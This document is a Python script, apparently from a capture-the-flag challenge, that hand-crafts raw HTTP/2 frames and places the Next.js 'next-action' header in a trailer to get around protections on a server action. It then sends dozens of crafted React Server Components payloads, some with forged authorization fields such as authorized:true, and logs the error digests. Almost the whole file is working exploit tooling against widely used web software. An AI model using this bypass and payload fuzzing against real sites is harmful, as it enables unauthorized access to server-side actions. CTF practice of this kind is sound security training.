#!/usr/bin/env python3
"""
probe36: try different action body signatures via trailer-bypass.

We know:
- body=`["$K1"]` → 200, action runs cleanly (formData arg)
- body=`[]`     → 500, digest=2760153669
- body=`[null]` → 500, digest=3528718245
- body=primitive → 500, digest=3817372229

Try multi-arg, special tokens, different formats.
"""
import socket
import ssl
import struct
import time
import re
import json
import hashlib
from hpack import Encoder, Decoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443

with open("/tmp/funi.actionid") as f:
    ACTION_ID = f.read().strip()
print(f"# action_id = {ACTION_ID}")

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def open_h2():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(PREFACE)
    sock.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
    return sock


def call_action(body_bytes, content_type="text/plain;charset=UTF-8", path="/", extra=None):
    sid = 1
    enc = Encoder()
    headers = [
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", path),
        ("accept", "text/x-component"),
        ("content-type", content_type),
        ("content-length", str(len(body_bytes))),
        ("trailer", "next-action"),
        ("user-agent", "p36"),
    ]
    if extra:
        for k, v in extra:
            headers.append((k, v))
    head_block = enc.encode(headers)
    trailer_block = enc.encode([("next-action", ACTION_ID)])

    sock = open_h2()
    sock.settimeout(2)
    try:
        sock.recv(65536)
    except Exception:
        pass
    sock.settimeout(15)
    raw = struct.pack(">I", len(head_block))[1:] + b"\x01" + bytes([0x04]) + struct.pack(">I", sid) + head_block
    sock.sendall(raw)
    raw = struct.pack(">I", len(body_bytes))[1:] + b"\x00" + bytes([0x00]) + struct.pack(">I", sid) + body_bytes
    sock.sendall(raw)
    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + bytes([0x05]) + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    sock.settimeout(15)
    buf = b""
    deadline = time.time() + 15
    while time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except (socket.timeout, OSError):
            break
        if not chunk:
            break
        buf += chunk
    sock.close()

    body = b""
    pos = 0
    dec = Decoder()
    status = None
    while pos < len(buf):
        if len(buf) - pos < 9:
            break
        length = int.from_bytes(buf[pos:pos+3], "big")
        ftype = buf[pos+3]
        flags = buf[pos+4]
        sid_ = int.from_bytes(buf[pos+5:pos+9], "big") & 0x7fffffff
        payload = buf[pos+9:pos+9+length]
        pos += 9 + length
        if ftype == 1:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            if flags & 0x20:
                data = data[5:]
            try:
                hdrs = dec.decode(data)
                for k, v in hdrs:
                    sk = k.decode() if isinstance(k, bytes) else k
                    sv = v.decode() if isinstance(v, bytes) else v
                    if sk == ":status":
                        status = sv
            except Exception:
                pass
        elif ftype == 0:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            body += data
    return status, body


def extract_digest(body):
    text = body.decode("utf-8", "replace")
    m = re.search(r'1:E\{[^}]*"digest":"([0-9a-fA-F]+)"', text)
    return m.group(1) if m else None


def extract_row1(body):
    text = body.decode("utf-8", "replace")
    m = re.search(r'^1:(\{.*?\})$', text, re.MULTILINE)
    if m:
        try:
            return json.loads(m.group(1))
        except Exception:
            return m.group(1)
    return None


# Bodies to try
BODIES = [
    # control
    b'["$K1"]',
    b'[]',
    b'[null]',
    # 2-arg with K1 second
    b'["south-line.2026-03-27","$K1"]',
    b'["WO-17-04","$K1"]',
    b'["\xd0\x9e\xd0\x9f-3 / \xd0\xb2\xd0\xb5\xd1\x80\xd1\x85\xd0\xbd\xd1\x8f\xd1\x8f \xd1\x81\xd1\x82\xd0\xb0\xd0\xbd\xd1\x86\xd0\xb8\xd1\x8f","$K1"]',
    # K1 first
    b'["$K1","south-line.2026-03-27"]',
    b'["$K1","WO-17-04"]',
    # 4-arg
    b'["south-line.2026-03-27","WO-17-04","\xd0\x9e\xd0\x9f-3 / \xd0\xb2\xd0\xb5\xd1\x80\xd1\x85\xd0\xbd\xd1\x8f\xd1\x8f \xd1\x81\xd1\x82\xd0\xb0\xd0\xbd\xd1\x86\xd0\xb8\xd1\x8f","$K1"]',
    b'["south-line.2026-03-27","WO-17-04","\xd0\x9e\xd0\x9f-3 / \xd0\xb2\xd0\xb5\xd1\x80\xd1\x85\xd0\xbd\xd1\x8f\xd1\x8f \xd1\x81\xd1\x82\xd0\xb0\xd0\xbd\xd1\x86\xd0\xb8\xd1\x8f"]',
    # special tokens
    b'["recoveryAction","$K1"]',
    b'["4082c44f4a6a9cc400f0e6b45ed1c06c10f100aad2","$K1"]',
    # date / today
    b'["2026-03-27","$K1"]',
    b'["2026-04-25","$K1"]',
    b'["2026-04-25T16:00:00Z","$K1"]',
    # boolean
    b'[true,"$K1"]',
    b'[false,"$K1"]',
    b'[true]',
    b'[false]',
    # strings of interest
    b'["confirm","$K1"]',
    b'["restore","$K1"]',
    b'["recovery","$K1"]',
    b'["yes","$K1"]',
    b'["override","$K1"]',
    # null + K1
    b'[null,"$K1"]',
    # signed bound action arg patterns
    b'[{"_$":"$K1"}]',
    b'[{"$$typeof":"react.element"}]',
    # K1 alternate refs
    b'["$1"]', b'["$2"]', b'["$F1"]', b'["$F2"]', b'["$P1"]', b'["$T1"]', b'["$Q1"]',
    # Empty object as arg
    b'[{}]',
    b'[{"packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"\xd0\x9e\xd0\x9f-3 / \xd0\xb2\xd0\xb5\xd1\x80\xd1\x85\xd0\xbd\xd1\x8f\xd1\x8f \xd1\x81\xd1\x82\xd0\xb0\xd0\xbd\xd1\x86\xd0\xb8\xd1\x8f"}]',
    b'[{"packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"\xd0\x9e\xd0\x9f-3 / \xd0\xb2\xd0\xb5\xd1\x80\xd1\x85\xd0\xbd\xd1\x8f\xd1\x8f \xd1\x81\xd1\x82\xd0\xb0\xd0\xbd\xd1\x86\xd0\xb8\xd1\x8f","authorized":true}]',
    b'[{"authorized":true,"role":"engineer"},"$K1"]',
    b'[{"token":"valid","scope":"recovery"},"$K1"]',
    # Ref form for strings
    b'1:"south-line.2026-03-27"\n0:["$1","$K1"]',
    b'1:{"packet":"south-line.2026-03-27"}\n0:["$1"]',
    # Bound array
    b'["$@1","$K1"]',
    # raw FormData reference forms
    b'["$0"]',
    b'["$0","$K1"]',
]

print(f"\n{'body':<100} status digest row1")
seen_digests = {}
seen_rows = {}
unique_count = 0
for b in BODIES:
    try:
        st, resp = call_action(b)
    except Exception as e:
        print(f"  {repr(b)[:90]:90s} ERR={e}")
        continue
    digest = extract_digest(resp)
    row1 = extract_row1(resp)
    sha = hashlib.sha256(resp).hexdigest()[:12]
    err = row1.get("error") if isinstance(row1, dict) else None
    msg = (row1.get("message", "") if isinstance(row1, dict) else "")[:50] if row1 else ""
    label = repr(b.decode("utf-8", "replace"))[:90]
    new_marker = ""
    if digest and digest not in seen_digests:
        new_marker = " [NEW DIGEST]"
        seen_digests[digest] = b
        unique_count += 1
    elif row1 and isinstance(row1, dict):
        rkey = (err, msg)
        if rkey not in seen_rows:
            new_marker = " [NEW row1]"
            seen_rows[rkey] = b
            unique_count += 1
    print(f"  {label:90s} st={st} digest={digest} sha={sha} err={err} msg={msg!r}{new_marker}")
    if row1 and isinstance(row1, dict) and err and err != "recovery-offline":
        print(f"    !!! UNUSUAL ERROR: {row1}")
    time.sleep(0.4)

print(f"\n# Unique digests/responses: {unique_count}")
for d, b in seen_digests.items():
    print(f"  digest {d}: {b!r}")
for r, b in seen_rows.items():
    print(f"  row {r}: {b!r}")

print("\n# done.")
